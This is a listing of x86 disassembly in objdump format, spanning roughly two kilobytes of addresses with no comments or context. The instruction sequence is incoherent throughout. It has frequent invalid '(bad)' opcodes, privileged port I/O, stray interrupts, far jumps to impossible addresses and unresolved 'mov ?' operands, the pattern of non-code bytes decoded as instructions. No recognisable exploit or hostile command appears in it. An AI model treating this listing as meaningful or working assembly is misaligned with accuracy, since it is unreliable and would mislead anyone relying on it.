  41332a:	or     ecx,DWORD PTR [ebx+0x7fbada72]
  413330:	sub    BYTE PTR [eax+0x2e010a0b],ah
  413336:	xlat   BYTE PTR ds:[ebx]
  413337:	shl    DWORD PTR [eax-0x45],cl
  41333a:	xlat   BYTE PTR ds:[ebx]
  41333b:	add    al,0xe6
  41333d:	push   edx
  41333e:	sub    dl,BYTE PTR [eax+0x14ed62c5]
  413344:	lods   eax,DWORD PTR ds:[esi]
  413345:	adc    eax,0x74e35716
  41334a:	adc    ebp,ebx
  41334c:	out    dx,al
  41334d:	or     DWORD PTR [edx],0xb929f098
  413353:	push   esp
  413354:	mov    dh,0xf9
  413356:	mov    ah,0xb5
  413358:	or     BYTE PTR [ebx],cl
  41335a:	push   ecx
  41335b:	push   0x28
  41335d:	es mov dh,0x7
  413360:	add    ebp,DWORD PTR [edx+0x4a]
  413363:	lods   eax,DWORD PTR ds:[esi]
  413364:	push   ebp
  413365:	adc    bl,bl
  413367:	lock ss jo 0x41336f
  41336b:	push   ss
  41336c:	jnp    0x413345
  41336e:	lea    esi,ds:0x3d6bdce4
  413374:	pop    esi
  413375:	test   ch,dh
  413377:	inc    esp
  413378:	pop    ss
  413379:	xchg   ebp,eax
  41337a:	xchg   edx,eax
  41337b:	icebp  
  41337c:	(bad)  
  41337d:	sar    BYTE PTR [eax],cl
  41337f:	push   esi
  413380:	cmovnp ecx,DWORD PTR [eax+eax*2]
  413384:	push   ds
  413385:	std    
  413386:	or     cl,ch
  413388:	loopne 0x4133f9
  41338a:	mov    eax,0xf1c89c1b
  41338f:	gs loope 0x413371
  413392:	push   ebp
  413393:	retf   
  413394:	pop    ds
  413395:	jmp    0x5189dddf
  41339a:	sub    al,0x0
  41339c:	(bad)  
  41339d:	lds    ebx,FWORD PTR [edx-0x64]
  4133a0:	fnstenv [esi+0x64]
  4133a3:	jmp    0x24ca2e63
  4133a8:	sub    esi,esi
  4133aa:	sub    ch,BYTE PTR [ebp-0x38]
  4133ad:	(bad)  
  4133ae:	xchg   ebp,eax
  4133af:	in     al,dx
  4133b0:	mov    al,BYTE PTR [ecx]
  4133b2:	push   esp
  4133b3:	mov    bh,0x70
  4133b5:	jp     0x41334f
  4133b7:	push   esi
  4133b8:	mov    al,ds:0x607dc744
  4133bd:	and    ebx,DWORD PTR [ecx]
  4133bf:	push   0x1a
  4133c1:	jp     0x413412
  4133c3:	cmp    bl,BYTE PTR [ecx-0x35]
  4133c6:	fnsave [edx-0x66]
  4133c9:	arpl   WORD PTR [eax+0x46],bp
  4133cc:	inc    ebx
  4133cd:	xor    DWORD PTR [esi+0x73],0x5136856d
  4133d4:	mov    al,ds:0x57f9c507
  4133d9:	cwde   
  4133da:	push   edx
  4133db:	(bad)  [edi+ecx*8+0x262b9d3f]
  4133e2:	ja     0x413416
  4133e4:	pop    ds
  4133e5:	jge    0x4133c4
  4133e7:	lea    esi,[eax+0x63]
  4133ea:	rcr    BYTE PTR [esi-0x2ea9795e],cl
  4133f0:	sbb    eax,ebp
  4133f2:	push   ss
  4133f3:	pop    edi
  4133f4:	shl    DWORD PTR [esi-0x58bcfbcb],0xa9
  4133fb:	lods   eax,DWORD PTR ds:[esi]
  4133fc:	in     al,dx
  4133fd:	call   0x9cb86cb6
  413402:	and    eax,0xeb68a73a
  413407:	mov    edi,0xceb1b6b4
  41340c:	mov    cl,0xc8
  41340e:	mov    bh,0x31
  413410:	outs   dx,DWORD PTR ds:[esi]
  413411:	sbb    al,0x2c
  413413:	test   ebx,ebp
  413415:	jae    0x4133ef
  413417:	push   ecx
  413418:	jmp    0xfd98:0x7b7b71ba
  41341f:	or     ch,bl
  413421:	out    dx,eax
  413422:	xor    dl,ch
  413424:	sbb    edx,ebp
  413426:	stc    
  413427:	xor    eax,0xbf217d78
  41342c:	sbb    ecx,DWORD PTR [ecx+0xe]
  41342f:	rcr    BYTE PTR [edi+ebp*1-0x2b2c79c1],0x99
  413437:	jmp    0x413402
  413439:	out    dx,eax
  41343a:	xchg   ebx,eax
  41343b:	dec    esi
  41343c:	mov    ?,ebx
  41343e:	lock push eax
  413440:	inc    edi
  413441:	sbb    ch,0x5e
  413444:	in     al,0x9
  413446:	int    0xfb
  413448:	sahf   
  413449:	int    0x7b
  41344b:	in     eax,dx
  41344c:	cmp    al,0xf7
  41344e:	fisub  WORD PTR [edi]
  413450:	push   ecx
  413451:	fsubr  QWORD PTR [edi+eiz*2]
  413454:	sbb    edx,DWORD PTR [ecx+0x79]
  413457:	(bad)  
  413458:	and    al,0x46
  41345a:	shl    BYTE PTR [eax-0x215935f4],0xd7
  413461:	sahf   
  413462:	or     DWORD PTR [esi+0x7e1f41d0],edx
  413468:	sub    ch,BYTE PTR [ebx+0x17fb90ab]
  41346e:	inc    ebp
  41346f:	aad    0x6c
  413471:	fnstenv fs:[edi+0x24800d4d]
  413478:	add    BYTE PTR [edi-0x4226ac66],al
  41347e:	mov    dh,0xc1
  413480:	fild   DWORD PTR [ebp+0x41]
  413483:	and    al,0xd1
  413485:	mov    DWORD PTR [ebp-0x54],esi
  413488:	xchg   esp,eax
  413489:	xor    al,0xcd
  41348b:	push   0x65
  41348d:	std    
  41348e:	popa   
  41348f:	jmp    0x413500
  413491:	and    bh,dl
  413493:	lea    esp,[eax]
  413495:	mov    ds:0x854e4963,eax
  41349a:	mov    ah,0x58
  41349c:	pop    ss
  41349d:	repnz cdq 
  41349f:	pop    edi
  4134a0:	in     eax,0x58
  4134a2:	or     BYTE PTR [eax-0x2f],al
  4134a5:	shr    DWORD PTR [edx],cl
  4134a7:	add    ebp,DWORD PTR [ecx-0x5e723b26]
  4134ad:	pop    edi
  4134ae:	in     al,0xe0
  4134b0:	pusha  
  4134b1:	adc    DWORD PTR [edi],0x37
  4134b4:	jne    0x413492
  4134b6:	loopne 0x413484
  4134b8:	daa    
  4134b9:	lods   eax,DWORD PTR ds:[esi]
  4134ba:	xchg   ecx,eax
  4134bb:	js     0x413491
  4134bd:	addr16 jnp 0x413481
  4134c0:	cs lahf 
  4134c2:	sbb    DWORD PTR [edx],eax
  4134c4:	mov    ah,0x1
  4134c6:	xor    DWORD PTR [ebx+0x5e],0xffffffc0
  4134ca:	cmp    eax,0xda6e7927
  4134cf:	jmp    FWORD PTR [ebp+0x2b]
  4134d2:	xor    ah,BYTE PTR [esi-0x5d6e50f4]
  4134d8:	dec    ebp
  4134d9:	mov    WORD PTR [ecx-0x155ff6a4],ds
  4134df:	mov    eax,ds:0xc2157aa6
  4134e4:	addr16 xor dl,0x48
  4134e8:	and    esp,DWORD PTR [esi+0x5c]
  4134eb:	push   edx
  4134ec:	mov    ecx,0xd50efeb7
  4134f1:	xor    cl,dl
  4134f3:	pop    es
  4134f4:	jne    0x4134f8
  4134f6:	dec    edx
  4134f7:	push   esp
  4134f8:	jp     0x413534
  4134fa:	mov    ebx,0xa2addc07
  4134ff:	fmul   QWORD PTR [esi+0x272c7b9e]
  413505:	enter  0x158d,0xac
  413509:	and    eax,0x4629fdba
  41350e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41350f:	(bad)
  413513:	cmp    eax,0xd2481118
  413518:	adc    cl,BYTE PTR [ecx+0x66]
  41351b:	add    ebp,esp
  41351d:	jmp    0x29d6:0x5fd116f5
  413524:	fbld   TBYTE PTR [ecx-0x75d97b1e]
  41352a:	push   eax
  41352b:	inc    edi
  41352c:	push   edx
  41352d:	cs ins BYTE PTR es:[edi],dx
  41352f:	cmp    al,0x43
  413531:	in     al,0x3e
  413533:	jo     0x41357d
  413535:	test   BYTE PTR [eax-0x76],bl
  413538:	and    al,0x54
  41353a:	mov    ch,dl
  41353c:	sub    esp,DWORD PTR [edx+0x5f]
  41353f:	scas   eax,DWORD PTR es:[edi]
  413540:	std    
  413541:	dec    ebp
  413542:	je     0x41352c
  413544:	jo     0x4134d8
  413546:	inc    eax
  413547:	mov    ds:0xb35598a9,eax
  41354c:	sti    
  41354d:	sbb    bl,BYTE PTR [ebp-0x21]
  413550:	push   edi
  413551:	in     al,0xf1
  413553:	cmp    edx,edx
  413555:	mov    esi,0x9bb922ee
  41355a:	in     eax,0xd0
  41355c:	repz aad 0x1d
  41355f:	pop    esi
  413560:	xor    cl,BYTE PTR [esi-0x3c]
  413563:	cld    
  413564:	enter  0x60e5,0x81
  413568:	jns    0x413533
  41356a:	test   eax,0x3566a4e2
  41356f:	std    
  413570:	push   ebp
  413571:	in     eax,0x42
  413573:	sti    
  413574:	enter  0xcf10,0xd4
  413578:	xor    esp,ebx
  41357a:	sbb    BYTE PTR [edx+0x814ca23],bl
  413580:	sbb    DWORD PTR [eax-0x48212818],ebp
  413586:	into   
  413587:	adc    al,0x47
  413589:	in     al,0x5f
  41358b:	mov    cl,0x5e
  41358d:	lea    edx,[ebx+0x2c]
  413590:	and    dl,cl
  413592:	not    ecx
  413594:	add    ch,BYTE PTR [edx-0x76]
  413597:	dec    edx
  413598:	push   cs
  413599:	xor    edi,DWORD PTR [edi+0x72]
  41359c:	jg     0x413547
  41359e:	sub    eax,0x84422c13
  4135a3:	sub    dl,BYTE PTR [esp+edi*4+0x8]
  4135a7:	mov    al,ds:0x547d73a
  4135ac:	inc    edi
  4135ad:	sub    cl,dh
  4135af:	add    esp,ebx
  4135b1:	add    ecx,DWORD PTR [ecx-0x6c]
  4135b4:	and    al,0x6c
  4135b6:	jnp    0x4135ed
  4135b8:	add    eax,0x45e6bba4
  4135bd:	jge    0x4135fe
  4135bf:	sahf   
  4135c0:	jp     0x413547
  4135c2:	mov    es,ecx
  4135c4:	iret   
  4135c5:	sbb    DWORD PTR [edi+0x6e],edx
  4135c8:	jb     0x413583
  4135ca:	imul   edi,DWORD PTR [edi],0xa1c4fbdd
  4135d0:	fbstp  TBYTE PTR [eax+0x46aeb627]
  4135d6:	into   
  4135d7:	jne    0x41357c
  4135d9:	sbb    ebx,DWORD PTR [edx+ebx*2]
  4135dc:	mov    ah,0x3d
  4135de:	jns    0x4135b0
  4135e0:	cmp    eax,esi
  4135e2:	or     DWORD PTR [ebp+0x794ff037],edx
  4135e8:	adc    eax,0xa1b7fd2f
  4135ed:	dec    ebp
  4135ee:	sti    
  4135ef:	fdiv   st(0),st
  4135f1:	test   eax,0x31623ca6
  4135f6:	repz adc ecx,DWORD PTR [ebx]
  4135f9:	je     0x413660
  4135fb:	mov    edx,0x20b47a0e
  413600:	popa   
  413601:	cmp    cl,BYTE PTR [edx-0x4d59eeeb]
  413607:	std    
  413608:	cld    
  413609:	iret   
  41360a:	mov    bh,0xd7
  41360c:	fs push esi
  41360e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41360f:	icebp  
  413610:	push   ebx
  413611:	fistp  WORD PTR [esi-0x14592a05]
  413617:	arpl   WORD PTR [ecx+0x51d910b0],si
  41361d:	(bad)  
  41361e:	out    dx,eax
  41361f:	rol    BYTE PTR cs:[eax+edi*4],1
  413623:	nop
  413624:	and    al,0x16
  413626:	xlat   BYTE PTR ds:[ebx]
  413627:	push   ds
  413628:	mov    edi,0x2c7659a1
  41362d:	dec    edi
  41362e:	sub    eax,0xed5f7e57
  413633:	adc    esi,DWORD PTR [esi-0xa0d946d]
  413639:	jae    0x413672
  41363b:	sub    esp,DWORD PTR [ecx+0x7469a0dc]
  413641:	(bad)  
  413642:	in     eax,dx
  413643:	jmp    0x9db71166
  413648:	xor    DWORD PTR [edi],ebx
  41364a:	stos   DWORD PTR es:[edi],eax
  41364b:	jl     0x41369d
  41364d:	or     DWORD PTR [eax+edi*1],0x130aee18
  413654:	add    eax,0xe73d570a
  413659:	idiv   BYTE PTR [edx+0x45]
  41365c:	adc    eax,ebx
  41365e:	cli    
  41365f:	xchg   BYTE PTR [edx-0x3c4d958a],bl
  413665:	rcl    bl,1
  413667:	adc    edi,DWORD PTR [ecx+0x66cfbc1f]
  41366d:	mov    DWORD PTR [ebx+0xcdfa0d2],edx
  413673:	cmp    BYTE PTR [esi+0x18438144],bh
  413679:	aam    0xf0
  41367b:	into   
  41367c:	das    
  41367d:	jle    0x413620
  41367f:	add    eax,0x235f2e77
  413684:	fnstenv [esi]
  413686:	push   ebx
  413687:	loop   0x4136a3
  413689:	js     0x4136d9
  41368b:	dec    edi
  41368c:	pop    es
  41368d:	retf   0xddf5
  413690:	int    0xed
  413692:	jb     0x41365f
  413694:	outs   dx,DWORD PTR ds:[esi]
  413695:	sub    DWORD PTR [ebx-0x44],ecx
  413698:	pop    esp
  413699:	ret    0xeb71
  41369c:	pop    ds
  41369d:	inc    edi
  41369e:	push   0x40
  4136a0:	mov    ds:0xcc776617,eax
  4136a5:	stos   BYTE PTR es:[edi],al
  4136a6:	hlt    
  4136a7:	adc    DWORD PTR [ebp-0x1661e6d5],esp
  4136ad:	mov    ds:0xc4b45629,al
  4136b2:	test   al,0x82
  4136b4:	out    dx,al
  4136b5:	iret   
  4136b6:	add    ebp,DWORD PTR [esp+ecx*2+0x75]
  4136ba:	cmc    
  4136bb:	sbb    BYTE PTR [eax+eiz*1],al
  4136be:	js     0x413675
  4136c0:	imul   edx,DWORD PTR [eax+eiz*1+0x56],0xce3b6b8
  4136c8:	mov    DWORD PTR [edi+0x6],esi
  4136cb:	mov    al,0xa8
  4136cd:	rcr    bl,1
  4136cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136d0:	outs   dx,BYTE PTR ds:[esi]
  4136d1:	sbb    ecx,esp
  4136d3:	sbb    DWORD PTR [ebp+0x5af2a10],edi
  4136d9:	adc    cl,BYTE PTR [ecx]
  4136db:	jne    0x413713
  4136dd:	cs scas al,BYTE PTR es:[edi]
  4136df:	inc    ebp
  4136e0:	push   edx
  4136e1:	in     al,0xfd
  4136e3:	(bad)  
  4136e4:	psrlw  mm3,QWORD PTR [eax+ecx*8-0x39]
  4136e9:	or     DWORD PTR [ebp+ebp*1+0x79],eax
  4136ed:	test   esi,ebx
  4136ef:	jbe    0x41372c
  4136f1:	fs mov eax,0xbdabf366
  4136f7:	mov    cl,0xfd
  4136f9:	and    BYTE PTR [ebp-0x7e07445e],ch
  4136ff:	push   eax
  413700:	popf   
  413701:	sbb    eax,0x8068db8c
  413706:	or     DWORD PTR [ecx+0x5f],edx
  413709:	shl    DWORD PTR [ecx+0x39e9372c],0x7e
  413710:	in     eax,dx
  413711:	inc    esp
  413712:	mov    dl,0xe3
  413714:	fwait
  413715:	hlt    
  413716:	dec    ecx
  413717:	shr    DWORD PTR ds:[ecx],cl
  41371a:	push   ebp
  41371b:	mov    cl,0x90
  41371d:	ds pop esp
  41371f:	sub    BYTE PTR [esp+edi*2],bl
  413722:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413723:	cmp    al,0xcb
  413725:	mov    esp,0x489e7aab
  41372a:	out    0xe6,al
  41372c:	or     esp,ebp
  41372e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41372f:	pop    es
  413730:	cli    
  413731:	xor    cl,bl
  413733:	into   
  413734:	inc    edx
  413735:	push   0x459f2e0
  41373a:	test   DWORD PTR [ecx+0x37],ecx
  41373d:	pop    edx
  41373e:	xor    al,ch
  413740:	xor    eax,0x3ebfaf00
  413745:	push   es
  413746:	mov    edi,0xf818f20c
  41374b:	iret   
  41374c:	adc    ebx,DWORD PTR [eax]
  41374e:	clc    
  41374f:	int3   
  413750:	jg     0x41372d
  413752:	loope  0x4137b8
  413754:	in     al,dx
  413755:	add    al,0x15
  413757:	imul   esp,DWORD PTR [edi-0x6b],0x4360dfc2
  41375e:	and    al,BYTE PTR [ebx]
  413760:	pusha  
  413761:	or     DWORD PTR [ebx],eax
  413763:	push   edi
  413764:	jg     0x41378d
  413766:	sub    eax,0xe21552a8
  41376b:	popa   
  41376c:	fidivr DWORD PTR [ebx]
  41376e:	ret    
  41376f:	or     edi,DWORD PTR [edi-0x28d5f841]
  413775:	jmp    0xaaef:0xa79260aa
  41377c:	cs ret 0xf352
  413780:	ret    0xc5f4
  413783:	jns    0x413804
  413785:	xchg   ebp,eax
  413786:	xor    BYTE PTR [ebx-0x668a1252],dl
  41378c:	cli    
  41378d:	mov    ecx,0xd25b9bd3
  413792:	cmp    dh,BYTE PTR [ebp+0x31]
  413795:	inc    ecx
  413796:	or     DWORD PTR [ebp+0x6011d54e],ecx
  41379c:	sbb    DWORD PTR ds:0x4186c4a7,esp
  4137a2:	out    dx,eax
  4137a3:	(bad)  
  4137a4:	cmp    eax,edi
  4137a6:	cs ror cl,1
  4137a9:	fwait
  4137aa:	test   BYTE PTR [ecx-0x28],dh
  4137ad:	xor    BYTE PTR [edi-0x5d49aede],al
  4137b3:	xchg   edx,eax
  4137b4:	mov    ds:0x382b7d6b,al
  4137b9:	ret    
  4137ba:	inc    edi
  4137bb:	repz fst QWORD PTR [edx+0x5a5d91b1]
  4137c2:	push   ebx
  4137c3:	in     eax,dx
  4137c4:	xor    BYTE PTR [ebp-0x7f7700b0],dh
  4137ca:	rcl    BYTE PTR [eax-0x27],1
  4137cd:	lock lods al,BYTE PTR ds:[esi]
  4137cf:	cld    
  4137d0:	call   0xca593463
  4137d5:	cdq    
  4137d6:	outs   dx,BYTE PTR ds:[esi]
  4137d7:	fcmovu st,st(7)
  4137d9:	fild   QWORD PTR [edi]
  4137db:	cmp    DWORD PTR [eax+0x1520849d],ebp
  4137e1:	xor    al,0x12
  4137e3:	rcl    DWORD PTR [ebx],1
  4137e5:	sar    DWORD PTR [esi+0x613e94ee],cl
  4137eb:	mov    al,ds:0xc1f83c1a
  4137f0:	xchg   ebx,eax
  4137f1:	(bad)  
  4137f2:	jl     0x4137c8
  4137f4:	in     eax,dx
  4137f5:	add    ebp,ebx
  4137f7:	mov    dh,ch
  4137f9:	cmp    ah,0x22
  4137fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137fd:	xlat   BYTE PTR ds:[ebx]
  4137fe:	fstp   QWORD PTR [eax-0x60]
  413801:	mov    esp,0xa67e87ec
  413806:	sti    
  413807:	mov    WORD PTR fs:[edx-0x13db05c5],es
  41380e:	(bad)  
  41380f:	cld    
  413810:	ficom  DWORD PTR [edi+0x31]
  413813:	sar    BYTE PTR [ebx+ebx*2+0xe],0xaf
  413818:	jmp    0x1c79b2ca
  41381d:	in     eax,dx
  41381e:	rcl    BYTE PTR [esp-0x32423302],0x10
  413826:	mov    edx,0xed118562
  41382b:	jmp    0x51d5:0xe920afaf
  413832:	dec    esp
  413833:	mov    BYTE PTR [edx+ebp*8+0x2a972ba],ch
  41383a:	jl     0x4137bf
  41383c:	sub    ch,BYTE PTR [edi-0x14]
  41383f:	ja     0x4138b3
  413841:	out    0x5d,al
  413843:	out    dx,al
  413844:	jmp    0x413836
  413846:	push   cs
  413847:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413848:	dec    ebx
  413849:	nop
  41384a:	jo     0x4138c0
  41384c:	std    
  41384d:	stc    
  41384e:	sub    bh,BYTE PTR [ebp+0x6e420383]
  413854:	test   DWORD PTR [esi],edi
  413856:	dec    ebx
  413857:	jmp    0x2c3b1ebd
  41385c:	in     eax,dx
  41385d:	test   al,0x6e
  41385f:	(bad)  
  413860:	mov    edx,0xfc36ed03
  413865:	xor    edi,DWORD PTR [eax]
  413867:	loop   0x4138c7
  413869:	scas   al,BYTE PTR es:[edi]
  41386a:	pusha  
  41386b:	push   0xffffffaf
  41386d:	xchg   esp,eax
  41386e:	and    BYTE PTR [esi],bh
  413870:	stos   DWORD PTR es:[edi],eax
  413871:	and    BYTE PTR [ecx],al
  413873:	and    DWORD PTR [ecx-0x51],ecx
  413876:	adc    al,0xca
  413878:	jg     0x41382c
  41387a:	imul   ecx,DWORD PTR [ecx],0x44
  41387d:	pop    esp
  41387e:	aad    0xcb
  413880:	push   0x40
  413882:	aas    
  413883:	pop    esp
  413884:	xchg   BYTE PTR [ecx+0x12651f96],dl
  41388a:	push   ds
  41388b:	and    eax,0x88bd5e49
  413890:	dec    eax
  413891:	jns    0x41387d
  413893:	shl    DWORD PTR [ecx+0x13],0xca
  413897:	xchg   ebp,eax
  413898:	mov    ch,bl
  41389a:	ins    DWORD PTR es:[edi],dx
  41389b:	mov    al,0xfb
  41389d:	mov    ebx,0x56fce262
  4138a2:	pusha  
  4138a3:	les    esp,FWORD PTR [edi+0x42]
  4138a6:	adc    DWORD PTR [edx+0x5],esp
  4138a9:	xor    DWORD PTR [edx-0x56daf911],ecx
  4138af:	and    ch,BYTE PTR [edi+0x2578af65]
  4138b5:	inc    ebx
  4138b6:	in     al,dx
  4138b7:	adc    ebx,DWORD PTR [eax+ebx*4-0x35]
  4138bb:	rol    BYTE PTR [ebx],0xad
  4138be:	enter  0x1ea9,0x68
  4138c2:	fwait
  4138c3:	dec    DWORD PTR gs:[edi-0x5f]
  4138c7:	ret    
  4138c8:	aad    0xd9
  4138ca:	adc    eax,0xa87df7df
  4138cf:	xchg   DWORD PTR [ebp+0x6e],edx
  4138d2:	into   
  4138d3:	out    dx,eax
  4138d4:	jecxz  0x4138b6
  4138d6:	inc    ecx
  4138d7:	push   cs
  4138d8:	(bad)  
  4138d9:	cmp    ax,0x2016
  4138dd:	retf   
  4138de:	pop    esi
  4138df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138e0:	mov    dh,0x6c
  4138e2:	fistp  QWORD PTR ds:0xc0593961
  4138e8:	inc    esi
  4138e9:	xor    BYTE PTR [eax+0xc605772],al
  4138ef:	dec    esi
  4138f0:	outs   dx,DWORD PTR ds:[esi]
  4138f1:	adc    BYTE PTR [esp+esi*2],0xb4
  4138f5:	cmp    eax,0x2318f71a
  4138fa:	stos   BYTE PTR es:[edi],al
  4138fb:	lods   eax,DWORD PTR ds:[esi]
  4138fc:	push   ecx
  4138fd:	sub    bh,BYTE PTR [edi-0x7b]
  413900:	cmp    DWORD PTR [ebx],ebp
  413902:	aam    0xc4
  413904:	test   DWORD PTR [ecx+0x4d],eax
  413907:	pop    ecx
  413908:	xor    eax,0x7044419a
  41390d:	lock mov ?,WORD PTR [edx+0x4d]
  413911:	imul   ecx,ecx,0xc7c76cbd
  413917:	sar    BYTE PTR [ecx+0x2d],cl
  41391a:	nop
  41391b:	dec    esp
  41391c:	add    BYTE PTR ds:0xcde1058e,0x3
  413923:	xchg   DWORD PTR [esi+0x64f0912],edx
  413929:	sbb    BYTE PTR [edi],ch
  41392b:	in     al,dx
  41392c:	fcomi  st,st(0)
  41392e:	shr    ah,cl
  413930:	sub    edi,DWORD PTR [eax-0x73]
  413933:	data16 cld 
  413935:	jmp    0x41393d
  413937:	push   edi
  413938:	aas    
  413939:	sub    DWORD PTR [esi+0x5],edx
  41393c:	sub    ah,BYTE PTR [edi-0x69475334]
  413942:	cmc    
  413943:	pop    ecx
  413944:	ret    
  413945:	int    0x7b
  413947:	mov    cl,0xe8
  413949:	(bad)  
  41394a:	leave  
  41394b:	out    dx,eax
  41394c:	lods   al,BYTE PTR ds:[esi]
  41394d:	out    0x7a,eax
  41394f:	xchg   ebp,eax
  413950:	mov    cl,0x8
  413952:	and    DWORD PTR [ecx+esi*1],edx
  413955:	int3   
  413956:	cmc    
  413957:	rcr    DWORD PTR [ebp-0x15],0xa5
  41395b:	retf   0xc6a2
  41395e:	cmp    DWORD PTR [edi-0x45],eax
  413961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413962:	stos   DWORD PTR es:[edi],eax
  413963:	in     al,dx
  413964:	scas   eax,DWORD PTR es:[edi]
  413965:	(bad)  
  413966:	mov    ch,0xfe
  413968:	imul   ecx,esi,0x6d
  41396b:	(bad)  
  41396c:	dec    BYTE PTR [ecx+edi*1]
  41396f:	jns    0x4139b6
  413971:	pushf  
  413972:	xor    dl,0xd0
  413975:	mov    ?,edx
  413977:	jbe    0x4139aa
  413979:	and    BYTE PTR [ecx+0x29],bh
  41397c:	mov    DWORD PTR [edx-0x39],ebx
  41397f:	arpl   di,cx
  413981:	lea    ecx,[eax-0x5b]
  413984:	inc    ebx
  413985:	sar    ch,cl
  413987:	aas    
  413988:	mov    dh,0x89
  41398a:	and    DWORD PTR [eax-0x237694da],ecx
  413990:	mov    ss,WORD PTR [ebx-0x328f91ab]
  413996:	sub    ecx,DWORD PTR [eax-0x5bf12adf]
  41399c:	imul   BYTE PTR [ebx-0x80]
  41399f:	jmp    0x5010:0xae653bcb
  4139a6:	loop   0x413981
  4139a8:	dec    ebp
  4139a9:	xor    eax,0xc6bba159
  4139ae:	cmp    eax,0x610ff76d
  4139b3:	sbb    eax,0x9f78ecd
  4139b8:	and    eax,0xc7aca133
  4139bd:	dec    eax
  4139be:	fidivr DWORD PTR [eax+0x9]
  4139c1:	and    BYTE PTR [eax+0x47],bh
  4139c4:	sub    al,BYTE PTR [ebp-0x1c]
  4139c7:	jne    0x4139c7
  4139c9:	sub    DWORD PTR [eax-0x7d5f5438],ebp
  4139cf:	int3   
  4139d0:	push   0xa783613b
  4139d5:	cmp    al,0xbe
  4139d7:	in     eax,0x22
  4139d9:	mov    esp,edi
  4139db:	xlat   BYTE PTR ds:[ebx]
  4139dc:	or     al,BYTE PTR [edx-0x67e24feb]
  4139e2:	xchg   BYTE PTR [edx-0x6cfa2448],dl
  4139e8:	inc    esp
  4139e9:	test   BYTE PTR [ebx],ch
  4139eb:	inc    ebx
  4139ec:	cdq    
  4139ed:	in     al,dx
  4139ee:	cs add al,0x6e
  4139f1:	jno    0x4139c8
  4139f3:	cdq    
  4139f4:	push   esp
  4139f5:	retf   0x5329
  4139f8:	push   edx
  4139f9:	dec    esp
  4139fa:	jecxz  0x413985
  4139fc:	jmp    0x823:0xe7476811
  413a03:	ret    
  413a04:	cli    
  413a05:	lock xchg esp,eax
  413a07:	retf   0x76
  413a0a:	jno    0x4139e8
  413a0c:	and    DWORD PTR [ebp-0x56260bca],0xef20135a
  413a16:	imul   eax,DWORD PTR [esi],0xfffffffa
  413a19:	add    edx,DWORD PTR [ecx-0x5]
  413a1c:	adc    eax,0xdd03862b
  413a21:	jg     0x4139e2
  413a23:	or     BYTE PTR [edi-0x74eb5508],dh
  413a29:	inc    ecx
  413a2a:	mov    dh,0xae
  413a2c:	(bad)  [eax-0x20bd1191]
  413a32:	xor    al,BYTE PTR [edi+0x4e]
  413a35:	xchg   esi,eax
  413a36:	ficom  DWORD PTR [edx]
  413a38:	out    dx,al
  413a39:	jg     0x4139f4
  413a3b:	mov    al,0xd3
  413a3d:	out    0xa4,al
  413a3f:	mov    eax,0x21ae1383
  413a44:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  413a46:	hlt    
  413a47:	and    ecx,esp
  413a49:	aaa    
  413a4a:	or     dl,BYTE PTR [eax-0x178fb9a8]
  413a50:	aaa    
  413a51:	lds    esp,FWORD PTR [ebx-0x58ee9348]
  413a57:	stos   DWORD PTR es:[edi],eax
  413a58:	fst    QWORD PTR [esi]
  413a5a:	xor    BYTE PTR [edx+edx*1+0x638d677],bh
  413a61:	push   0x4
  413a63:	out    dx,al
  413a64:	mov    WORD PTR [ecx-0x3a3c0abc],fs
  413a6a:	aaa    
  413a6b:	ins    BYTE PTR es:[edi],dx
  413a6c:	std    
  413a6d:	push   cs
  413a6e:	jo     0x413a8c
  413a70:	in     al,0x7b
  413a72:	std    
  413a73:	xchg   ebx,eax
  413a74:	push   0x33454a2e
  413a79:	push   eax
  413a7a:	lods   al,BYTE PTR ds:[esi]
  413a7b:	mov    ds:0x81e6b6f,al
  413a80:	xor    BYTE PTR [ebx],bl
  413a82:	into   
  413a83:	add    ecx,edi
  413a85:	xor    eax,ebp
  413a87:	or     DWORD PTR [ebx+0x6e0d2e75],esi
  413a8d:	lods   al,BYTE PTR ds:[esi]
  413a8e:	ja     0x413aa0
  413a90:	gs mov ah,0xd7
  413a93:	mov    eax,0xc81b5189
  413a98:	(bad)  
  413a99:	mov    esp,0x1360164d
  413a9e:	mov    ah,bl
  413aa0:	sar    BYTE PTR [edi-0x5c],1
  413aa3:	mov    esp,0xd5f210a7
  413aa8:	adc    eax,0x80afe54d
  413aad:	jo     0x413ae7
  413aaf:	jae    0x413ae7
  413ab1:	jp     0x413a4f
  413ab3:	push   es
  413ab4:	cmp    edx,DWORD PTR [edi]
  413ab6:	shl    DWORD PTR [eax],cl
  413ab8:	sbb    esp,DWORD PTR [edi-0x25]
  413abb:	jae    0x413b16
  413abd:	daa    
  413abe:	fwait
  413abf:	outs   dx,DWORD PTR ds:[esi]
  413ac0:	adc    DWORD PTR [edi+0x46],esp
  413ac3:	xchg   ecx,eax
  413ac4:	(bad)  
  413ac5:	shl    BYTE PTR [edx],0x5f
  413ac8:	shr    edx,1
  413aca:	lea    eax,[ecx-0x5e]
  413acd:	mov    edx,0x5cb45dba
  413ad2:	jne    0x413a94
  413ad4:	loopne 0x413aa6
  413ad6:	pop    edi
  413ad7:	mov    dl,0x2e
  413ad9:	mov    dh,0x39
  413adb:	or     al,cl
  413add:	dec    ebp
  413ade:	cmp    ebp,DWORD PTR [edi+esi*8+0x3894ae59]
  413ae5:	scas   eax,DWORD PTR es:[edi]
  413ae6:	in     al,0xa3
  413ae8:	jb     0x413acd
  413aea:	sbb    DWORD PTR [edx],esi
  413aec:	enter  0x82ce,0x35
  413af0:	sbb    eax,0x33117791
  413af5:	push   0x33af652e
  413afa:	outs   dx,BYTE PTR ds:[esi]
  413afb:	add    ebx,eax
  413afd:	(bad)  
  413afe:	sbb    eax,0xd8b77060
  413b03:	sub    eax,0xf6df97d3
  413b08:	pop    ss
  413b09:	nop
  413b0a:	cld    
  413b0b:	dec    ebp
  413b0c:	out    0xb4,eax
  413b0e:	sbb    esi,edx
  413b10:	fs xchg esi,eax
  413b12:	xor    ah,BYTE PTR [ebx]
  413b14:	and    eax,0x746a826d
